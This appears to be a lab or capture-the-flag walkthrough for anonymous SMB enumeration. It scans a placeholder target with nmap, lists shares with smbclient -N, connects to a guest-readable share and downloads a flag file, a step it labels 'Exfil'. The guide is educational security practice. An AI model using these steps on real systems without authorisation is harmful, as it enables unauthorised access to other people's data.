# SMB share enumeration (anonymous / guest)

Walkthrough pattern: **Nmap** finds **SMB**; **`smbclient`** lists shares; a **custom share** allows unauthenticated access; **`get`** retrieves the objective file. Replace `<TARGET_IP>` with your lab address consistently in every command.

---

## Step 1 — Nmap

```bash
nmap -sV -sC -O <TARGET_IP>
```

| Flag | Purpose |
|------|---------|
| `-sV` | Service/version on open ports |
| `-sC` | Default NSE scripts (SMB enumeration helpers) |
| `-O` | Remote OS fingerprint (may be low confidence behind firewalls) |

**Expect:** **TCP 445** (`microsoft-ds`) and related **137/139** NetBIOS services on Windows targets.

---

## Step 2 — List shares

```bash
smbclient -N -L //<TARGET_IP>/
```

| Flag | Purpose |
|------|---------|
| `-N` | No password (guest / anonymous where permitted) |
| `-L` | List share names |

**QC:** On Linux use `//IP/` URL form; escaping backslashes (`\\\\IP\\`) is optional in `smbclient` depending on version.

Identify non-default shares (e.g. `WorkShare`) for manual review.

---

## Step 3 — Connect to the share

```bash
smbclient //<TARGET_IP>/WorkShare -N
```

If the server allows **guest** access, pressing **Enter** at the password prompt may succeed.

---

## Step 4 — Browse and download

Inside the `smb:` prompt:

```text
ls
get flag.txt
```

| Command | Purpose |
|---------|---------|
| `ls` | Remote directory listing |
| `get <file>` | Download to your **local current working directory** |

```text
exit
```

---

## Step 5 — Verify locally

```bash
cat flag.txt
```

---

## Summary

| Step | Command | Note |
|------|---------|------|
| Scan | `nmap -sV -sC -O <TARGET_IP>` | Baseline SMB discovery |
| List | `smbclient -N -L //<TARGET_IP>/` | Map shares |
| Connect | `smbclient //<TARGET_IP>/WorkShare -N` | Anonymous/guest test |
| Exfil | `get flag.txt` | Pull artifact |

---

## Lessons

- Anonymous read on custom shares is a **high** finding when data is sensitive.
- Always align **one target IP** across notes—mixed IPs in raw logs confuse later review.

**Status:** lab objectives completed.
